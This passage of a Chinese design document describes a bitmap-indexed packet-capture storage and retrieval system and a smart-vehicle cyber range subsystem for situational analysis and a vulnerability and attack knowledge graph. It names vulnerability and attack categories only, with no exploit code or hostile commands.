data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/3c14b096eeffadeed9a29c7df5198534.png"></p><p>报文缓存系统中，有两个部分组成：数据包存储区和报文偏移表，如上图所示。每个数据包在写入缓存时，都会加入一个Pcap头，并都有一个顺序标识符pkt-id（上图中的packet XX）。报文偏移表数组将pkt-id映射到数据包跟踪中的偏移量，该偏移量标记相应数据包的开头。这样，当到达输入缓存的最大长度或在指定的最大数据包数之后，我们分别这两部分到硬盘中。读取时，可以通过报文偏移表快速定位到报文所在的位置。</p><p>每次将报文写入缓存区时，需要将这个报文对应的五元组信息（源IP、目的IP、源端口、目的端口、协议号）发送给索引管理模块，为索引管理模块提供建立索引的输入数据，具体的如何使用此五元组，以索引管理模块中详细描述。</p><p>而之前缓冲区使用4G大小的目的，是使报文偏移表中，每个节点的内容都可以使用4字节，32bit最大可以存储4G大小，不会导致溢出。</p><p>当落盘时，将这两部分整体写入硬盘中，分别存一个文件，将记录下这两个文件对应存储的最小报文时间，以及最晚报文时间，便于查询时分析是否要使用这两个文件进行查询处理。</p><p>在此模块中，主要的执行步骤如下：</p><ol><li>收报文时先在报文头部添加Pcap头</li><li>然后将报文全部写入缓存区</li><li>将报文对应的五元组信息（及此报文对应的pkt-id序号）发送给索引管理模块处理</li><li>为此报文在报文偏移表中写入此报文对应的偏移长度</li><li>判断缓冲区是否满，如果已满将缓存区写入硬盘、并将报文偏移表写入硬盘</li><li>记录这个文件所对应的报文起止时间</li></ol><p>索引管理模块</p><p>当每次写入一个报文时，会收到一个需要处理的五元组信息（及此报文对应的pkt-id序号），并进行索引文件的实时整理刷新，而当缓存区数据满，需要写入硬盘时，索引管理模块在处理完成所有收到的五元组信息时，将此索引文件写入硬盘中。形成每次落盘会有三个文件形成一组，三个文件分别对应：</p><ul><li>原始报文存储文件</li><li>报文偏移表文件</li><li>索引文件</li></ul><p>三个文件对应一组，当查询时如果查询条件中的时间范围中命中这组文件对应的时间时，将进行这组文件的检索。</p><p>索引的的建立方式将为每个元素建立一个bitmap表，元素与五元组强相关：</p><ul><li>PV4时：为源IP的4个字节分别建bitmap表，4个字节分别标记为第一位、第二位、第三位、第四位，目的IP与源IP相同，分别也建立4维的bitmap表</li><li>IPV6时，为源IP建立16个bitmap表，分别是第一位到第十六位的bitmap表，目的IP也相同</li><li>源端口与目的端口都将建两维的bitmap表</li><li>协议号建一维的bitmap表</li></ul><p>Bitmap表中，每个bit代表是一个pkt-id序号对应的标记，例如，当收一个包的源IP为192.168.0.1的报文时，我们将需要处理的对应的索引为：</p><ul><li>源IP第一位索引为192（每一位的索引最大有256个，当前处理192，其它的以此类批）</li><li>源IP第二位的索引处理为168</li><li>源IP第三位的索引处理为0</li><li>源IP第四位的索引处理为1</li></ul><p>具体的处理如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/2877485d3bdd6011d6c12419ed73eed1.png"></p><p>如上图所示，当pkt-id为100的报文送过来的源IP为192.168.0.1时，我们为每一位的索引都将此ID的标记置上。</p><p>由此我们可以计算得出，总共的最大索引量为：</p><ol><li>IPV4时：源IP共 4 * 256个索引项、目的IP共4*256个索引项，源端口为2*256个索引项、目的端口为2*256个索引项，协议号为256个索引项</li><li>IPV6时：源IP共 16 * 256个索引项、目的IP共16*256个索引项，源端口为2*256个索引项、目的端口为2*256个索引项，协议号为256个索引项</li><li>因而在IPV4场景时，最大总索引项为3328个索引项</li><li>在IPV6场景时，最大总索引项为9472个索引项</li><li>每个索引项占用的空间为总包数的bit数，例如此存储文件共2000万包，那每个索引项最大占用2.5M</li></ol><p>以上计算的是理论是的最大值，但是现实使用时远远用不了这么多索引项，例如：</p><ul><li>使用场景中，当协议号只有UDP、TCP、ICMP时，那协议号的索引项只占用3个，并不是256个</li><li>而源IP如果只有192.168.0.0/24的网络范围IP时，那IP对应的第一位索引项、第二位索引项、第三位索引项分别都只有一个索引项。</li></ul><p>数据存储模块</p><p>数据存储模块主要负责两大块工作：</p><ul><li>硬盘的写入与读取工作，当缓存数据满时，会将数据交由数据存储模块完成。需要达到不低于5Gbps的写入性能</li><li>当硬盘空间不足时，需要能回收最老的数据，为新数据提供可用硬盘空间。回收果需要将报文数据区、报文偏移表区、索引文件一同回收</li><li>数据的读取工作，在检索完成后，可以得到需要读取数据的区域及位置，此模块需要能快速读取硬盘数据</li></ul><p>因而落盘的过程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7c11a12c35d338e0b1d2be96583867a8.png"></p><p>在查询过程中，需要通过读取这几个文件进行查询分析，具体步骤如下：</p><ol><li>先读取出索引文件，分析符合条件的所有报文序号（详细的方案将在检索模块中描述）</li><li>再读取出偏移表文件，根据第一步查询出的所有报文序号，读取出所有报文对应的在数据文件的偏移位置</li><li>再打开数据文件，逐个报文的读取出数据</li><li>最后再将读取出的数据整合成一个PCAP文件写入硬盘</li></ol><p>具体的操作过程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ef01c97fa6324314bc120bc279801e97.png"></p><p>检索模块</p><p>在输入检索条件后，整个过程分成三部分，前两部分是检索过程，最后一步是读取数据过程。三步分为：</p><ol><li>读取索引文件，找到哪些报文符合条件（检索过程）</li><li>读取偏移表文件，找到所有符合条件报文对应的偏移位置（检索过程）</li><li>通过所有报文的偏移位置，到文件位置中读取出所有报文（读取过程）</li></ol><p>完成以上三部分才完成整个检索及读取过程，如果用户还需要叠加BPF过滤，还需要将读取出来的所有报文通过BPF过滤，最终符合条件的报文才是需要输出的报文，此时再将这些报文整理一个完整的PCAP文件。</p><p>第一步的操作是读取索引文件，通过索引文件查找所有符合条件的报文，这里我们将查询条件为源IP：172.16.0.0/16，目的端口：80。具体的整个检索过程如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/715b4ae4e6bde49e1be490024722e110.png"></p><p>如上图所示，由于源IP是16掩码，由于低两字节是掩码忽略，因而只需要查询第一索引位（172索引）与第二索引位（16索引），目的端口为80，因而第一索引位为0，第二索引位为80。因而总共需要将4个索引位进行与处理（如上图），将4个索引位进行与操作，最终得出有效的是100、200这两个pkt id对应的报文</p><p>第二步将是通过pkt id查找到应的偏移位置，如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/434bb33842e08dcfb2712f048a83f6d1.png"></p><p>如上图所示，将100、200这两个包对应的偏移通过偏移表中找到对应的值，将计算出每个包的长度（100包的长度 = 101的偏移 – 100的偏移）</p><p>最后一步是通过偏移表读取出文件中对应的报文。</p><h1 id="智能汽车网络靶场态势分析分系统"><a href="#智能汽车网络靶场态势分析分系统" class="headerlink" title="智能汽车网络靶场态势分析分系统"></a>智能汽车网络靶场态势分析分系统</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>根据试验配置管理分系统的试验配置，基于目标网络管理分系统的试验场景网络拓扑结构和数据采集分系统采集的节点状态、网络流量，智能汽车网络靶场态势分析分系统对靶场内的网络和虚拟节点内信息进行全量分析，并基于TCP、UDP传输协议的syslog安全事件日志实时生成、融合安全事件，利用网络安全知识图谱技术实现实时基础攻击检测和智能汽车安全攻击场景的复杂攻击检测。态势分析数据以宏观可视化、微观可视化的形式将试验中的资产、队伍、人员、攻击等展示在界面上，将态势数据以用户易懂的方式予以呈现。</p><h2 id="系统架构-1"><a href="#系统架构-1" class="headerlink" title="系统架构"></a>系统架构</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/9f4caef8b290c98ec4f3490551926a86.png"></p><p>系统架构图如上所示，详细内容包括：</p><ul><li>前后端分离的企业级微服务架构</li><li>基于SpringCloudAlibaba</li><li>主要针对解决微服务和业务开发时常见的非功能性需求</li><li>深度定制SpringSecurity真正实现了基于RBAC、jwt和oauth2的无状态统一权限认证的解决方案</li><li>面向互联网设计，同时适合B端和C端用户</li><li>支持CI/CD多环境部署</li><li>提供应用管理，方便第三方系统接入，支持多租户(应用隔离)</li><li>引入组件化的思想实现高内聚低耦合并且高度可配置化</li><li>注重代码规范，严格控制包依赖，每个工程基本都是最小依赖</li></ul><h2 id="态势分析控制管理模块"><a href="#态势分析控制管理模块" class="headerlink" title="态势分析控制管理模块"></a>态势分析控制管理模块</h2><p>支持试验相关数据概括呈现，包括试验关联队伍、靶标、设备相关数据和试验资产漏洞、基础攻击、有效攻击、复杂攻击等相关安全攻防数据统计与直观展示，需提供产品功能截图证明。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/1d1cdddf78604325aa49f166f9693e86.png" alt="企业微信截图_6e2605f8-a886-43b7-9c5f-1125f1cffa5c"></p><p>功能参数设计为，系统支持智能汽车应用试验基础信息的自动与手动同步管理，涵盖夺旗赛、攻防赛、红蓝对抗、综合演练等，依此索引开展任务。监测并管理汽车应用试验分析状态，基于试验操作指令自动转换状态。</p><p>试验前配置资产漏洞探测策略，包括探测范围。试验前资产漏洞探测启停指令控制，可重复探测。配置靶向检测策略，针对试验前攻击子图生成与注册控制。试验相关数据概括呈现，包括试验关联队伍、靶标、设备数据和安全攻防数据统计与展示。同步管理应用关联靶标信息，修改补充靶标信息。</p><p>统一同步并管理参与试验的队伍信息。统一同步并管理试验拓扑内节点设备，进行重构与管理。试验中基础攻击与复杂攻击数据采集数量统计。试验中靶向检测数据采集运行状态与数据接收时间统计。试验中流量分析数据统计。试验中有效攻击检测数据数量统计。试验结束后进行回放处理，选择时间段、回放速度进行态势数据回放。回放时间段选择试验开始与结束间任意时间段。支持数据快放、慢放处理。回放任务的启停控制。支持靶场多试验任务并行处理与分析。</p><p>性能参数设计为，系统支持100个试验并行控制管理。</p><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>本方案旨在构建一个高效、精准的汽车应用试验综合管理系统，用于实现试验基础信息的同步管理、试验状态的监测与管理、试验前配置、数据概括呈现、靶标信息管理、试验拓扑管理、数据采集与统计、试验回放处理以及多试验任务并行处理与分析等多种功能。系统将支持高达100个试验任务的并行控制管理，满足高并发的网络安全试验场景需求。</p><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>基础信息同步管理</p><p>自动与手动同步管理：系统将支持自动与手动同步试验的基础信息，覆盖夺旗赛、攻防赛、红蓝对抗、综合演练等多种模式，确保试验任务的准确性和及时性。</p><p>试验状态监测与管理</p><p>状态监测与转换：系统可基于试验操作指令自动进行状态转换，流畅地过渡试前、试中、试后的各个阶段，确保试验的连续性和有效性。</p><p>试验前配置</p><p>资产漏洞探测策略：用户可配置资产漏洞探测策略，包括探测范围，以便精确识别潜在风险。</p><p>漏洞探测指令控制：支持试验前资产漏洞探测的启动与停止指令控制，允许反复进行探测以确保准确性。</p><p>靶向检测策略：用户可根据需要配置靶向检测策略，包括攻击类型等，以便针对性地进行攻击检测。</p><p>攻击子图生成与注册：基于试验资产漏洞探测数据与网络安全攻击知识，系统将自动生成试验相关的场景知识图谱，并将攻击子图注册到有效的攻击检测系统中。</p><p>数据概括呈现</p><p>试验相关数据展示：系统将支持试验相关数据的概括性呈现，涵盖试验关联队伍、靶标、设备相关数据，以及安全攻防数据的统计与直观展示。</p><p>靶标信息管理</p><p>靶标信息同步管理：系统将支持应用关联靶标信息的自动与手动同步统一管理，确保信息的准确性和一致性。</p><p>靶标信息修改补充：用户可对靶标信息进行修改和补充，包括虚拟靶标信息的同步展示以及实物靶标和单位靶标的新增、编辑和删除操作。</p><p>试验参与队伍管理</p><p>队伍信息管理：系统将统一同步并管理参与试验的队伍信息，支持队伍信息的新增、编辑、删除、批量导入&amp;导出功能。</p><p>试验拓扑管理</p><p>节点设备管理：支持统一同步并管理试验拓扑内的节点设备，包括虚拟设备和实物设备的信息同步展示，以及实物设备的新增、编辑和删除操作。</p><p>拓扑结构重构与管理：系统将支持基于动态变化的试验拓扑数据，进行节点与关系结构的重构与管理。</p><p>数据采集与统计</p><p>攻击数据统计：系统将支持试验中基础攻击与复杂攻击数据的采集数量统计。</p><p>靶向检测数据统计：支持靶向检测数据采集的运行状态与最近数据接收时间的统计。</p><p>流量分析数据统计：系统将支持试验中流量分析数据的统计，包括协议占比等。</p><p>有效攻击检测数据统计：支持试验中有效攻击检测数据数量的统计。</p><p>试验回放处理</p><p>试后回放：系统将支持试后数据的回放处理，以供用户对试验过程进行复盘分析。</p><p>回放时间段与速度选择：用户可选择任意试验时间段进行态势数据的回放，并可根据需求调整回放速度。</p><p>回放时间段选择：支持在试验开始时间与试验结束时间间的任意时间段选择进行数据回放。</p><p>快放处理：系统将支持数据的快放处理，倍速包括1.5x、2x、3x、4x。</p><p>慢放处理：支持数据的慢放处理，慢放倍速为0.5x。</p><p>回放控制操作：用户将能够控制回放任务的启动与停止。</p><p>多试验任务并行处理与分析</p><p>并行处理与分析：系统将支持靶场多试验任务的并行处理与分析，确保每个试验任务的独立性和系统整体的高效运作。</p><h5 id="性能-2"><a href="#性能-2" class="headerlink" title="性能"></a>性能</h5><p>并行控制管理：系统支持100个试验任务的并行控制管理，确保能够处理大规模的试验需求。</p><p>本方案提出的汽车应用试验综合管理系统，通过其全面的功能和高性能的设计，将极大地提升试验的效率和精确度。系统的实施将为汽车网络安全试验提供强有力的技术支持，确保试验的高效进行和结果的准确性。</p><h4 id="方案简介-9"><a href="#方案简介-9" class="headerlink" title="方案简介"></a>方案简介</h4><p>针对每一个试验任务，智能汽车网络靶场态势分析分系统需建立一个对应的态势分析任务，提供态势分析任务的管理界面，支持试验基础信息自动与手动同步管理，包括夺旗赛、攻防赛、红蓝对抗、综合演练等。支持对试验态势分析任务、参与队伍、成员及网络拓扑节点的集中管理，至多支持200个试验并行管理。支持试验分析状态的监测与管理，包括试前、试中、试后的转换，状态转换是根据试验操作指令自动进状态转换。且支持基于syslog安全事件日志自主修改安全事件融合与格式解析规则。</p><p>试验开始前，根据试验配置管理分系统同步的任务信息，可配置资产漏洞探测策略，涵盖探测范围。也可配置靶向检测策略，涵盖攻击类型。也可对靶标信息进行修改补充信息，从目标网络同步虚拟靶标信息进行展示、并且能够添加、修改以及删除单位靶标以及实物靶标。还可配置当前分系统的态势分析任务的人员信息和试验类型，除了传统的试验场景之外，对智能汽车业务仿真场景也支持相关态势分析配置与控制。应用关联靶标信息自动与手动同步统一管理，其中涵盖了单位靶标、实物靶标以及虚拟靶标。统一同步并管理参与试验的队伍信息，支持对试验的参与队伍进行添加、修改、删除、批量导入和导出的功能。统一同步并管理试验拓扑内的节点设备，包括虚拟设备和实物设备。支持从目标网络同步设备信息进行展示，且能够对添加、修改和删除实物设备。系统具备生成攻击子图的能力，并且支持相应的注册控制,基于网络安全攻击知识以及试验资产漏洞探测数据,系统可以产生试验相关场景知识图谱,并将攻击子图自动注册到有效攻击检测。可以动态变化的试验拓扑数据，进行试验拓扑节点与关系结构重构与管理。基于不同试验类型的场景，可规划态势的子任务，其中包括网络场景的流量检测、漏洞扫描、资产探测等，可进行资产漏洞探测启动与停止指令控制，态势分析的数据基础基于试前所配置的子任务，由用户自主选择单个试验需要采集、分析的数据。试验进行时，基于试前分配的子任务，实时基于采集数据进行态势分析检测，且支持在过程中控制分析的暂停或启动状态。靶场的多个试验环境是相互隔离进行的，数据采集、数据分析也是独立进行的。分系统支持多个试验并行处理分析及态势可视化展示，确保靶场多任务正常进行。可进行靶向检测数据采集运行状态、流量分析数据统计、基础攻击采集数量统计、最近数据接收时间统计、有效攻击检测数据数量统计以及复杂攻击数据采集数量统计等。</p><p>试验进行时，基于试前分配的子任务，实时基于采集数据进行态势分析检测，且支持在过程中控制分析的暂停或启动状态。靶场的多个试验环境是相互隔离进行的，数据采集、数据分析也是独立进行的。分系统支持多个试验并行处理分析及态势可视化展示，确保靶场多任务正常进行。可进行基础攻击与复杂攻击数据采集数量统计、最近数据接收时间统计、流量分析数据统计、靶向检测数据采集运行状态、有效攻击检测数据数量统计等。</p><p>试验结束后，可查看所有试验任务数据的态势可视化展示，掌握检测设备在线状态，试验相关数据概括呈现，包括靶标、基础攻击、有效攻击、复杂攻击、试验资产漏以及设备相关数据和试验关联队伍等。该模块还可支持试后回放,能够选择时间段、回放速度对态势数据进行回放,涵盖了复杂攻击的回放以及基础攻击的回放,试验开始时间与试验结束之间的任意时间段都可以进行回放,分快放和慢放,快放倍速为:1.5倍速、2倍速、3倍速、4倍速,慢放倍速为:0.5倍速,可进行启动以及停止回放。</p><p>基于态势分析控制管理模块的功能划分，该模块的主要元素包括试验管理和数据统计与展示管理，其中试验管理包含了试验状态控制和相关信息的管理，数据统计与展示管理包括数据采集和可视化展示的功能。所有在该模块配置的内容，均会直接关系到智能汽车网络靶场态势分析任务的实施与分析。</p><p>多试验任务处理子模块具备同时处理和分析靶场中多个试验任务的能力，确保高效而独立的任务执行。最高可进行150个试验的并行管理与控制。</p><p>详细子模块如下所示:</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c7f50dd9c3f91c6f1e6648ba29510d5c.png"></p><h2 id="网络安全场景知识图谱模块"><a href="#网络安全场景知识图谱模块" class="headerlink" title="网络安全场景知识图谱模块"></a>网络安全场景知识图谱模块</h2><p>可基于网络安全知识图谱中的知识，结合靶场汽车应用试验关联的节点、资产、漏洞数据，构建应用试验相关的试验场景图谱，支撑攻击检测分析与扩展研究，知识图谱关联的节点至少应包含被测车辆、零部件、虚拟化MCU、虚拟化MPU等4种类型，关联的资产至少应包含整车品牌、车型、车辆、车型项目（年款）、包含的零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等9类信息，漏洞数据至少包含漏洞名称、CVE编号、涉及平台、危害级别、漏洞类型、公开日期等6类信息。以上信息均可在同一个子图中以可视化的形式展现；</p><p>基于网络安全知识图谱的丰富知识，结合与靶场汽车应用试验关联的多个要素，可以构建出强大而全面的应用试验相关的试验场景图谱。这个知识图谱将为攻击检测分析和进一步的扩展研究提供坚实的基础。在这个知识图谱中，将聚焦于多种类型的关联节点，涵盖了汽车领域的关键组成部分。</p><p>以下是知识图谱关联的主要节点类型，每种节点类型都以可视化的方式展现：</p><ol><li>包含了汽车的标识信息、车型和车辆特性等。</li><li>可以清晰地显示被测车辆的属性和特征。</li><li>涵盖了车辆中各个组件的信息，如引擎、制动系统、安全气囊等。</li><li>提供了零部件的类型、型号和技术规格等详细信息。</li><li>包括了虚拟化MCU的配置和性能参数要求，用于车辆电子系统的控制。</li><li>可视化展示虚拟化MCU的组成和功能。</li><li>包括了虚拟化MPU的信息，这是车辆计算平台的核心。</li><li>提供了虚拟化MPU的性能规格和操作系统信息。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c118e0eb35ebf833bac3e512637518e2.png" alt="1703529971945"></p><p>试验场景图谱</p><p>在知识图谱的节点之间，还包括了关联的资产信息，这些信息涵盖了广泛的领域，如：</p><ol><li>识别汽车的制造商和品牌信息，以便确定车辆的制造背景。</li><li>确定车辆的具体型号和车型名称，以区分不同类型的汽车。</li><li>提供关于每辆车辆的详细信息，包括车辆的VIN号、注册信息等。</li><li>包括车型的不同年份版本，以跟踪车型的发展历程。</li><li>描述车辆零部件的硬件平台和技术规格。</li><li>提供车辆系统使用的操作系统内核的版本信息，以便安全性分析。</li><li>记录车辆各个组件的固件版本号，以便检测潜在漏洞。</li><li>包括车辆中使用的中间件的版本和配置信息。</li><li>提供车辆中运行的应用程序的版本和相关信息。</li></ol><p>最后，还将整合漏洞数据，其中包括漏洞的名称、CVE编号、涉及平台、危害级别、漏洞类型和公开日期等关键信息。这些数据将与其他节点相互关联，以帮助系统分析漏洞对车辆和零部件的潜在威胁。整个知识图谱将为智能汽车网络靶场提供全面的视图，帮助分析和解决安全挑战。</p><p>功能参数设计为，系统支持从互联网公开渠道获取智能汽车相关结构化和非结构化数据，自动抽取知识要素。基于CVSS3标准进行漏洞分数与漏洞危害等级关联映射。基于关键词识别漏洞描述，进行漏洞类型分类关联补全。从漏洞信息中抽取汽车漏洞实体与资产实体间关系。多维数据关联分析知识体系建立统一知识表示规范。联网自动进行汽车知识获取、抽取与更新。外网IP情报知识离线获取与更新，关联IP所属国家区域属性。基于抽取知识构建汽车网络安全知识图谱，支持知识更新。管理资产知识、漏洞知识、攻击知识，构建应用试验相关试验场景图谱。靶场试验场景图谱支持知识子图表示，快速联邦靶场间知识共享。基础攻击知识子图与复杂攻击知识子图注册到流计算引擎，支持复杂攻击检测。</p><p>性能参数设计为，资产知识对公开CPE覆盖率95%，漏洞知识对公开CVE覆盖率95%，攻击知识对公开CAPEC覆盖率95%，复杂攻击知识子图50种。</p><h4 id="方案设计-11"><a href="#方案设计-11" class="headerlink" title="方案设计"></a>方案设计</h4><p>随着智能汽车技术的迅猛发展，网络安全已成为汽车行业关注的焦点。为了有效防御针对智能汽车的网络攻击，构建一个全面的网络安全知识图谱是至关重要的。本方案旨在通过自动化技术支持智能汽车相关数据的获取、漏洞知识的抽取、资产知识的管理、攻击知识的构建及其更新，从而为智能汽车提供坚实的网络安全知识支持。</p><p>数据获取与知识抽取</p><p>智能汽车相关数据获取：支持从互联网公开渠道获取结构化和非结构化智能汽车相关数据，包括CVE、CNNVD、CNVD等，支持JSON、XML等多种数据文件格式。</p><p>知识要素自动抽取：支持基于标准规范模板从大规模多源信息中自动抽取智能汽车漏洞知识、资产知识、攻击知识等要素。</p><p>漏洞分数与等级映射：支持基于CVSS3标准进行漏洞分数与漏洞危害等级的关联映射，并支持调整配置参数进行手动修正。</p><p>漏洞类型分类关联补全：支持基于关键词对漏洞描述进行识别，进而进行漏洞类型的分类关联补全。</p><p>漏洞与资产关系抽取：支持从漏洞信息中抽取出汽车漏洞实体与汽车资产实体之间的关系，以及基于攻击信息进行攻击与漏洞之间的关系抽取。</p><p>多维数据关联分析：支持基于多维数据关联分析知识体系建立统一的知识表示规范，用于关联攻击、漏洞与资产之间的关系。</p><p>知识自动获取与更新：支持联网情况下，自动进行汽车知识的获取、抽取与更新。</p><p>IP情报知识离线获取与更新：支持外网IP情报知识离线获取与更新，关联IP所属国家与区域等属性，支持分析与可视化展示。</p><p>知识图谱构建与管理</p><p>汽车网络安全知识图谱构建：支持基于抽取得到的资产知识、漏洞知识、攻击知识，构建汽车网络安全知识图谱，并支持知识的持续更新。</p><p>资产知识管理：支持资产知识的管理，包括操作系统、应用程序对应的产品名称、版本、关联厂商等信息。</p><p>漏洞知识管理：支持漏洞知识的管理，包括漏洞CVE编号、危害等级、漏洞类型、威胁类型、漏洞描述等信息。</p><p>汽车漏洞知识覆盖：支持汽车漏洞知识的全面覆盖，包括车端网联零部件相关的多种漏洞类型，资产包括TBOX、网关、车机等，数量达到2000个。</p><p>漏洞知识批量管理：支持对漏洞知识的批量新增、更新、删除，并支持基于属性的条件模糊查询。</p><p>漏洞知识统计：支持对漏洞知识按年份、CVSS分数、漏洞类型和威胁程度进行统计。</p><p>漏洞知识关联查询：支持漏洞知识关联受影响的操作系统、硬件、软件表示，并支持模糊查询。</p><p>弱点知识管理：支持弱点知识管理，包括CWE编号、描述、关系、适用平台等信息。</p><p>漏洞与弱点知识关联：支持漏洞知识与弱点知识基于弱点编号引用进行关联。</p><p>基础攻击知识管理：支持基础攻击知识管理，包括攻击编号、名称、可能性等信息，覆盖多种攻击分类。</p><p>基础攻击知识批量管理：支持对基础攻击知识的批量新增、更新、删除，并支持基于属性的条件模糊查询。</p><p>复杂攻击知识管理：支持复杂攻击知识管理，包括攻击步骤、利用的漏洞等信息。</p><p>汽车攻击场景复杂攻击知识管理：支持汽车攻击场景的复杂攻击知识管理，包括攻击类型、漏洞等信息。</p><p>复杂攻击知识批量管理：支持对复杂攻击知识的批量新增、更新、删除，并支持基于属性的条件模糊查询。</p><p>知识实体属性与关系表示：支持对资产、攻击、漏洞等知识实体的属性和相互关系的表示，并以结构化数据进行组织。</p><p>试验场景图谱构建：可基于网络安全知识图谱中的知识，结合靶场汽车应用试验关联的节点、资产、漏洞数据，构建应用试验相关的试验场景图谱，支撑攻击检测分析与扩展研究。</p><p>知识子图表示：靶场试验场景图谱支持知识子图的表示，快速实现联邦靶场之间的知识共享，支持在线同步。</p><p>基础攻击知识子图：表示包括基础攻击类型与安全事件的实例关系，基础攻击类型与漏洞的利用关系，漏洞与资产的存在关系。</p><p>攻击子图分类表示：包括探测型、破坏型、控制型、资源消耗型攻击子图表示。</p><p>探测型攻击子图内容：包含漏洞软件扫描、资源泄漏暴露等。</p><p>破坏型攻击子图内容：包含对象注入、协议篡改等。</p><p>攻击子图模糊查询与展示：支持基于攻击名称对某类型攻击子图进行模糊查询，并以图谱方式展示。</p><p>复杂攻击知识子图：由基础攻击知识子图的正确组合构成，表示基础攻击的时序关系和空间关系。</p><p>复杂攻击子图表示：包括APT攻击、僵尸网络、DDoS等，并进行可视化展示。</p><p>APT攻击子图表示：包含海莲花攻击、夜龙攻击等APT攻击子图表示。</p><p>智能汽车网络靶场攻击子图表示：支持车云业务入侵攻击等智能汽车网络靶场联网业务攻防演练场景攻击子图表示。</p><p>攻击子图注册与检测支持：支持将基础攻击子图与复杂攻击子图注册到流计算引擎，支撑进行复杂攻击检测与有效攻击检测。</p><h3 id="方案简介-10"><a href="#方案简介-10" class="headerlink" title="方案简介"></a>方案简介</h3><p>基于实际试验任务环境资产、漏洞等信息，将场景知识图谱结合业务环境，具备从全局视角分析攻击，从宏观层面检测攻击的能力，从而避免大量的误报。利用知识图谱的知识抽取、知识融合、知识自主更新、知识推理等特点实现自动抽取网络安全知识、准确检测攻击还原攻击链的功能，功能中包括：基于标准规范模板从大规模多源的信息中，自动抽取知识要素；漏洞危害等级和漏洞分数是根据CVSS3标准进行对应,可自行修改相关参数调整关联;还可以进行漏洞类型的分类关联补全，这是根据关键词对漏洞描述进行识别的；可进行多维数据关联分析知识体系建立统一的知识表示规范处理，用于关联攻击、漏洞与资产之间的关系。在联网情况下，可以从互联网公开渠道获取结构化和非结构化智能汽车相关数据如CVE、CNNVD、CNVD，包括JSON、XML等数据文件格式，自动进行汽车知识获取、抽取与更新，同时进行离线获取和更新外网IP情报知识，关联IP的国家和区域等属性，以辅助分析并通过可视化方式展示。能够根据攻击信息进行漏洞以及攻击之间的关系抽取，也能够根据漏洞信息中抽取出汽车资产实体以及汽车漏洞实体之间的关系。CPE的覆盖率高达98.2%，CVE的覆盖率95.5%，CAPEC的覆盖率97.1%。还可以根据资产知识管理，包括操作系统、应用程序对应的产品名称、版本、关联厂商。</p><p>为了建立汽车靶场的知识图谱体系，提供针对汽车攻防场景相关的攻击资源库，其中包含与汽车攻防相关的漏洞资源库、弱点资源库、基础攻击资源库和复杂攻击资源库，资源库各类知识相关的资产主要分为硬件、软件和操作系统。漏洞分类包括硬件漏洞、软件漏洞和操作系统漏洞，基础攻击分类基于攻击方式主要包括探测类、攻击突破类、远程控制和窃取利用类等。可将抽取得到的资产知识、漏洞知识、攻击知识，构建汽车网络安全知识图谱，并支持知识更新，并且可以进行资产知识、漏洞知识管理，其中涵盖了包括漏洞描述、威胁类型、漏洞类型、漏洞CVE编号、危害等级。</p><p>汽车漏洞知识数量大于2000个，涵盖类型包括车端网联零部件相关的漏洞：</p><ol><li>内存溢出</li><li>目录穿越</li><li>整数溢出</li><li>解析错误</li><li>HTTP响应伪造</li><li>越权访问</li><li>ShellCode</li><li>HTTP请求伪造</li><li>SQL注入</li><li>代码执行</li><li>任意文件创建</li><li>缓存区过读</li><li>远程密码修改</li><li>暴力破解</li><li>远程溢出</li></ol><p>漏洞影响资产包括：</p><ol><li>远程控车</li><li>数字钥匙</li><li>中央处理单元</li><li>各类域控制器</li><li>TBOX</li><li>网关</li><li>车机以及</li><li>OTA</li><li>AVP</li></ol><p>可对漏洞知识的批量删除、更新、添加，并支持基于属性按条件模糊查询，并且将按威胁程度、漏洞类型、年份以及CVSS分数进行统计，漏洞知识还会关联受影响的操作系统、硬件、软件表示，支持条件查询、模糊查询。同时，可进行弱点资源库管理，每一条信息包括利用可能性、描述、关系、常见后果、适用平台、CWE编号、缓解措施等，同时漏洞知识基可以于弱点编号引用，也就是CWE编号进行关联。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/5c9c74bf7baa1e19064de1d1742f5794.png" 